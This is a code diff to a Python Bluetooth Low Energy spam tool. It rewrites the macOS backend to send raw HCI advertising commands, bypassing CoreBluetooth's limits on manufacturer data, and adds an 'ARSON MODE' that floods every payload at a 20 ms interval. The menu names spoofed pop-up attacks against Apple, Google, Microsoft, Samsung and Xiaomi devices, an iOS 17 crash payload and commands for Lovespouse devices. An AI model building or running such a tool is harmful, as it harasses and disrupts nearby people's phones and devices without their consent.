@@ -79,68 +79,86 @@ class BLEAdvertiser:
 
 
 class MacOSAdvertiser(BLEAdvertiser):
-    """macOS: CoreBluetooth via pyobjc.
+    """macOS: IOBluetooth raw HCI commands for BLE advertising.
 
-    Note: CoreBluetooth does not officially support setting arbitrary
-    manufacturer-specific data in advertisements.  The undocumented
-    key ``kCBAdvDataManufacturerData`` is used as a best-effort fallback,
-    but results may vary depending on the macOS version.
+    Uses IOBluetoothHostController to send raw HCI LE advertising
+    commands, bypassing CoreBluetooth's limitations on manufacturer data.
     """
 
     def __init__(self):
         try:
-            import objc  # noqa: F401 -- needed to bootstrap pyobjc
-            from CoreBluetooth import (
-                CBPeripheralManager,
-                CBAdvertisementDataLocalNameKey,
-                CBAdvertisementDataServiceUUIDsKey,
-                CBAdvertisementDataServiceDataKey,
-            )
-            from Foundation import NSData, CBUUID
-        except ImportError:
+            import objc
+            objc.loadBundle('IOBluetooth',
+                bundle_path='/System/Library/Frameworks/IOBluetooth.framework',
+                module_globals=globals())
+        except Exception:
             raise RuntimeError(
-                "pyobjc-framework-CoreBluetooth is required on macOS.\n"
-                "Install it with:\n"
-                "    pip install pyobjc-framework-CoreBluetooth"
+                "IOBluetooth framework not available.\n"
+                "This requires macOS with Bluetooth hardware."
             )
 
-        self.CBPeripheralManager = CBPeripheralManager
-        self.CBAdvertisementDataLocalNameKey = CBAdvertisementDataLocalNameKey
-        self.CBAdvertisementDataServiceUUIDsKey = CBAdvertisementDataServiceUUIDsKey
-        self.CBAdvertisementDataServiceDataKey = CBAdvertisementDataServiceDataKey
-        self.NSData = NSData
-        self.CBUUID = CBUUID
+        self.hc = IOBluetoothHostController.defaultController()  # noqa: F821
+        if self.hc is None:
+            raise RuntimeError("No Bluetooth controller found.")
+        if self.hc.powerState() != 1:
+            raise RuntimeError("Bluetooth is not powered on.")
 
-        self.manager = CBPeripheralManager.alloc().init()
-        time.sleep(0.5)  # wait for Bluetooth stack initialisation
+        print(f"IOBluetooth HCI initialized ({self.hc.addressAsString()})")
+        self._advertising = False
 
     def start(self, manufacturer_id=None, data=None,
               service_uuid=None, service_data=None, interval_ms=100):
-        ad_dict = {}
+        # Build raw AD structure
+        ad_bytes = b""
 
         if manufacturer_id is not None and data is not None:
-            # manufacturer_id (2 bytes LE) + data
             mfr_bytes = struct.pack("<H", manufacturer_id) + data
-            ns_data = self.NSData.dataWithBytes_length_(mfr_bytes, len(mfr_bytes))
-            # kCBAdvDataManufacturerData is an undocumented private key.
-            # It may or may not work depending on macOS version.
-            ad_dict["kCBAdvDataManufacturerData"] = ns_data
+            ad_bytes = bytes([len(mfr_bytes) + 1, 0xFF]) + mfr_bytes
 
-        if service_uuid and service_data is not None:
-            uuid_obj = self.CBUUID.UUIDWithString_(service_uuid)
-            ns_svc_data = self.NSData.dataWithBytes_length_(
-                service_data, len(service_data)
-            )
-            ad_dict[self.CBAdvertisementDataServiceUUIDsKey] = [uuid_obj]
-            # CBAdvertisementDataServiceDataKey maps CBUUID -> NSData
-            ad_dict[self.CBAdvertisementDataServiceDataKey] = {
-                uuid_obj: ns_svc_data
-            }
+        elif service_uuid and service_data is not None:
+            # Build service data AD (type 0x16 for 16-bit UUID)
+            import uuid as _uuid
+            uuid_obj = _uuid.UUID(service_uuid)
+            uuid_int = uuid_obj.int
+            base = _uuid.UUID("00000000-0000-1000-8000-00805F9B34FB").int
+            extracted_16 = (uuid_int >> 96) & 0xFFFF
+            reconstructed = base | (extracted_16 << 96)
+            if reconstructed == uuid_int:
+                uuid_bytes = struct.pack("<H", extracted_16)
+                ad_type = 0x16
+            else:
+                uuid_bytes = uuid_obj.bytes_le
+                ad_type = 0x21
+            svc_payload = uuid_bytes + service_data
+            ad_bytes = bytes([len(svc_payload) + 1, ad_type]) + svc_payload
 
-        self.manager.startAdvertising_(ad_dict)
+        if not ad_bytes:
+            return
+
+        # Truncate to 31 bytes max
+        if len(ad_bytes) > 31:
+            ad_bytes = ad_bytes[:31]
+
+        # Pad to 31 bytes
+        padded = ad_bytes + bytes(31 - len(ad_bytes))
+
+        # Stop current advertising if active
+        if self._advertising:
+            self.hc.BluetoothHCILESetAdvertiseEnable_(0)
+
+        # Set advertising data
+        self.hc.BluetoothHCILESetAdvertisingData_advertsingData_(
+            len(ad_bytes), padded
+        )
+
+        # Enable advertising
+        self.hc.BluetoothHCILESetAdvertiseEnable_(1)
+        self._advertising = True
 
     def stop(self):
-        self.manager.stopAdvertising()
+        if self._advertising:
+            self.hc.BluetoothHCILESetAdvertiseEnable_(0)
+            self._advertising = False
 
 
 class LinuxHCIAdvertiser(BLEAdvertiser):
@@ -417,36 +435,39 @@ TARGET_MAP = {
     "lovespouse": ["lovespouse_play", "lovespouse_stop"],
     "xiaomi": ["xiaomi_quickconnect"],
     "all": list(ALL_GENERATORS.keys()),
+    "arson": list(ALL_GENERATORS.keys()),
 }
 
 
 def show_menu():
     print("""
-+======================================+
-|       BLE Spam - Desktop Edition     |
-+======================================+
-|  1. Apple - New Device Pop-up        |
-|  2. Apple - Not Your Device          |
-|  3. Apple - New AirTag               |
-|  4. Apple - Action Modal             |
-|  5. Apple - iOS 17 Crash (patched)   |
-|  6. Google Fast Pair                 |
-|  7. Microsoft Swift Pair             |
-|  8. Samsung Buds                     |
-|  9. Samsung Watch                    |
-| 10. Lovespouse Play                  |
-| 11. Lovespouse Stop                  |
-| 12. Apple - AirDrop                  |
-| 13. Apple - AirPlay Target          |
-| 14. Apple - Handoff                  |
-| 15. Apple - Tethering Source         |
-| 16. Apple - Nearby Info              |
-| 17. Microsoft Swift Pair Headphone   |
-| 18. Xiaomi QuickConnect             |
-| 19. NameFlood                        |
-| 20. Kitchen Sink (all types random)  |
-|  0. Quit                             |
-+======================================+
++==========================================+
+|         BLE Spam - Desktop Edition       |
++==========================================+
+|  1. Apple - New Device Pop-up            |
+|  2. Apple - Not Your Device              |
+|  3. Apple - New AirTag                   |
+|  4. Apple - Action Modal                 |
+|  5. Apple - iOS 17 Crash (patched)       |
+|  6. Google Fast Pair                     |
+|  7. Microsoft Swift Pair                 |
+|  8. Samsung Buds                         |
+|  9. Samsung Watch                        |
+| 10. Lovespouse Play                      |
+| 11. Lovespouse Stop                      |
+| 12. Apple - AirDrop                      |
+| 13. Apple - AirPlay Target              |
+| 14. Apple - Handoff                      |
+| 15. Apple - Tethering Source             |
+| 16. Apple - Nearby Info                  |
+| 17. Microsoft Swift Pair Headphone       |
+| 18. Xiaomi QuickConnect                 |
+| 19. NameFlood                            |
+| 20. Kitchen Sink (all types random)      |
+|------------------------------------------|
+| 99. ARSON MODE (all types, 20ms blast)   |
+|  0. Quit                                 |
++==========================================+
 """)
 
 
@@ -471,6 +492,7 @@ MENU_MAP = {
     "18": "xiaomi_quickconnect",
     "19": "nameflood",
     "20": "all",
+    "99": "arson",
 }
 
 
@@ -584,7 +606,8 @@ def main():
 
     if args.target:
         keys = TARGET_MAP[args.target]
-        spam_loop(advertiser, keys, args.interval)
+        interval = 20 if args.target == "arson" else args.interval
+        spam_loop(advertiser, keys, interval)
     else:
         while True:
             show_menu()
@@ -596,11 +619,16 @@ def main():
                 break
             elif choice in MENU_MAP:
                 selected = MENU_MAP[choice]
-                if selected == "all":
+                if selected == "arson":
                     keys = list(ALL_GENERATORS.keys())
+                    print("\n*** ARSON MODE - 20ms interval, all payloads ***")
+                    spam_loop(advertiser, keys, 20)
+                elif selected == "all":
+                    keys = list(ALL_GENERATORS.keys())
+                    spam_loop(advertiser, keys, args.interval)
                 else:
                     keys = [selected]
-                spam_loop(advertiser, keys, args.interval)
+                    spam_loop(advertiser, keys, args.interval)
             else:
                 print("Invalid selection.")
 
